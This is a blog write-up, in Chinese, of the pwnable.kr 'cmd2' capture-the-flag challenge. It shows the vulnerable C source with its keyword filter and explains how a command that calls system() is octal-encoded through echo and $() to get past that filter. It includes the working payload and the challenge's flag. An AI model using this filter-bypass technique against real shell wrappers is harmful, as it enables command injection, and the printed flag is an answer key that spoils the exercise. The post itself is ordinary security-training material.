---
id: 71
title: pwnable.kr-cmd2
date: 2016-08-14T05:29:49+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=71
permalink: /pwnable-kr-cmd2/
categories:
  - pwn
tags:
  - bash
  - bypass
  - cmd
  - echo
  - payload
  - pwn
  - pwnable.kr
---
题目描述：

> Daddy bought me a system command shell.
  
> but he put some filters to prevent me from playing with it without his permission&#8230;
  
> but I wanna play anytime I want!
> 
> ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

这题ssh的登陆密码是cmd1的flag，登陆后查看cmd2.c的源代码：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int filter(char* cmd){
 int r=0;
 r += strstr(cmd, "=")!=0;
 r += strstr(cmd, "PATH")!=0;
 r += strstr(cmd, "export")!=0;
 r += strstr(cmd, "/")!=0;
 r += strstr(cmd, "`")!=0;
 r += strstr(cmd, "flag")!=0;
 return r;
}

extern char** environ;
void delete_env(){
 char** p;
 for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
 delete_env();
 putenv("PATH=/no_command_execution_until_you_become_a_hacker");
 if(filter(argv[1])) return 0;
 printf("%s\n", argv[1]);
 system( argv[1] );
 return 0;
}

</pre>

我们看到相比cmd1还多过滤了“/”，所以这里我们需要绕过这个限制，这里有多种方法可以绕过，经过测试我们发现通过cmd2中的system可以直接执行echo，但是其他的命令都需要绝对路径才行，也就是例如whoami需要&#8221;/bin/whoami&#8221;，这样会出现”/“。这里利用echo进行绕过：

把所有的字符经过8进制编码：

<pre class="brush: python; title: ; notranslate" title="">from pwn import *
cmd = "/bin/cat flag"
print "\\"+"\\".join([oct(i) for i in ordlist(cmd)])
</pre>

然后得到编码后的字符串，最后构造payload：

> cmd2@ubuntu:~$ ./cmd2 &#8216;$(echo &#8220;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&#8221;)&#8217;
  
> $(echo &#8220;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&#8221;)
  
> FuN\_w1th\_5h3ll\_v4riabl3s\_haha

可以成功得到flag:

FuN\_w1th\_5h3ll\_v4riabl3s\_haha